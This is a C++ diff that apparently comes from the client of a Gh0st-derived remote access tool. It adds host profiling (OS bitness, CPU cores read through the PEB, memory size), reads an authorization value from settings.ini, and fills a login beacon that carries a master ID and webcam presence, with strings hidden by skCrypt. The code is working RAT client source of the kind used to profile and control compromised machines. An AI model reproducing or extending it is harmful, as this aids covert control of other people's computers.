@@ -179,6 +179,50 @@ std::string getProcessTime() {
 	return buffer;
 }
 
+int getOSBits() {
+	SYSTEM_INFO si;
+	GetNativeSystemInfo(&si);
+
+	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
+		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
+		return 64;
+	}
+	else {
+		return 32;
+	}
+}
+
+// 检查CPU核心数
+// SYSTEM_INFO.dwNumberOfProcessors
+int GetCPUCores()
+{
+	INT i = 0;
+#ifdef _WIN64
+	// 在 x64 下，我们需要使用 `NtQuerySystemInformation`
+	SYSTEM_INFO sysInfo;
+	GetSystemInfo(&sysInfo);
+	i = sysInfo.dwNumberOfProcessors; // 获取 CPU 核心数
+#else
+	_asm { // x64编译模式下不支持__asm的汇编嵌入
+		mov eax, dword ptr fs : [0x18] ; // TEB
+		mov eax, dword ptr ds : [eax + 0x30] ; // PEB
+		mov eax, dword ptr ds : [eax + 0x64] ;
+		mov i, eax;
+	}
+#endif
+	Mprintf("此计算机CPU核心: %d\n", i);
+	return i;
+}
+
+double GetMemorySizeGB() {
+	_MEMORYSTATUSEX mst;
+	mst.dwLength = sizeof(mst);
+	GlobalMemoryStatusEx(&mst);
+	double GB = mst.ullTotalPhys / (1024.0 * 1024 * 1024);
+	Mprintf("此计算机内存: %fGB\n", GB);
+	return GB;
+}
+
 LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 {
 	LOGIN_INFOR  LoginInfor;
@@ -200,10 +244,10 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 	LoginInfor.dwCPUMHz = dwCPUMHz;
 	LoginInfor.bWebCamIsExist = bWebCamIsExist;
 	strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
-	sprintf_s(LoginInfor.szReserved, "%s", GetClientType(conn.ClientType()));
-	LoginInfor.AddReserved("?");                        // 系统位数
-	LoginInfor.AddReserved("?");                        // CPU核数
-	LoginInfor.AddReserved("?");                        // 系统内存
+	LoginInfor.AddReserved(GetClientType(conn.ClientType())); // 类型
+	LoginInfor.AddReserved(getOSBits());                // 系统位数
+	LoginInfor.AddReserved(GetCPUCores());              // CPU核数
+	LoginInfor.AddReserved(GetMemorySizeGB());          // 系统内存
 	char buf[_MAX_PATH] = {};
 	GetModuleFileNameA(NULL, buf, sizeof(buf));
 	LoginInfor.AddReserved(buf);                        // 文件路径
@@ -214,13 +258,31 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 		installTime = ToPekingTimeAsString(nullptr);;
 		WriteAppSettingA("install_time", installTime);
 	}
-	LoginInfor.AddReserved(installTime.c_str());
+	LoginInfor.AddReserved(installTime.c_str());		// 安装时间
+	LoginInfor.AddReserved("?");						// 安装信息
+	LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
+	std::string str;
+#ifndef _DEBUG
+	HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
+	if (hMutex != NULL) {
+		CloseHandle(hMutex);
+#else
+		{
+#endif
+		GET_FILEPATH(buf, "settings.ini");
+		char auth[_MAX_PATH] = { 0 };
+		GetPrivateProfileStringA("settings", "Password", "", auth, sizeof(auth), buf);
+		str = std::string(auth);
+		str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
+		auto list = StringToVector(str, '-', 3);
+		str = list[1];
+	}
+	LoginInfor.AddReserved(str.c_str());			   // 授权信息
 	bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
 		strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
 	std::string masterHash(skCrypt(MASTER_HASH));
 	const char* id = isDefault ? masterHash.c_str() : conn.szFlag;
 	memcpy(LoginInfor.szMasterID, id, min(strlen(id), 16));
-	
 	return LoginInfor;
 }
 
